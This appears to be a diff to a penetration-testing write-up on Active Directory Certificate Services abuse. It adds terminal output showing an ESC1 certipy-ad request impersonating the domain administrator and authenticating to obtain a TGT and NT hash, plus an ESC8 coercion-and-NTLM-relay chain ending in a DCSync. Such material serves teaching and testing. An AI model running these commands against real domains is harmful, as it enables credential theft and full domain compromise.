@@ -97,11 +97,21 @@ Certificate Templates
       ESC1 : Enrollee supplies subject and template allows client authentication
 ```
 
-<div class="img-placeholder">
-  <span class="ph-icon">🖼️</span>
-  <span class="ph-label">SCREENSHOT PLACEHOLDER</span>
-  <span class="ph-desc">certipy find -vulnerable output flagging [!] ESC1 on template "CorpUser"</span>
-</div>
+Chaining the request and PKINIT auth (ESC1) end-to-end:
+
+```terminal
+$ certipy-ad req -u m.rossi@corp.local -p 'Welcome2026!' -ca CORP-CA01-CA \
+      -template CorpUser -upn administrator@corp.local -dc-ip 10.10.10.100
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate (request ID 41)
+[*] Got certificate with UPN 'administrator@corp.local'
+[*] Saved certificate and private key to 'administrator.pfx'
+
+$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.10.100
+[*] Using principal: administrator@corp.local
+[*] Got TGT  ->  saved to 'administrator.ccache'
+[*] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+```
 
 ## ESC1 — Enrollee-supplied SAN + Client Auth
 
@@ -231,11 +241,19 @@ certipy-ad auth -pfx dc01.pfx -dc-ip $DC
 [*] Base64 certificate of user DC01$: MIIR... (saved dc01.pfx)
 ```
 
-<div class="img-placeholder">
-  <span class="ph-icon">🖼️</span>
-  <span class="ph-label">SCREENSHOT PLACEHOLDER</span>
-  <span class="ph-desc">ntlmrelayx capturing DC01$ auth and printing the issued certificate (ESC8)</span>
-</div>
+ESC8 relay flow (coercion -> relay -> DC certificate):
+
+```terminal
+ [ attacker ]                                  [ CA / certsrv (HTTP) ]
+     |  ntlmrelayx --adcs --template DomainController   ^
+     |                                                  |  relayed NTLM auth (as DC01$)
+     v                                                  |
+ PetitPotam / Coercer  ---- coerce auth ---->  [ DC01 ]-+
+     |
+     v
+ issued certificate for DC01$  =>  certipy auth -pfx dc01.pfx
+     =>  DC01$ TGT  =>  secretsdump -k (DCSync)  =>  krbtgt  =>  domain owned
+```
 
 ## Complete Attack Chain (ESC1 → domain)
 
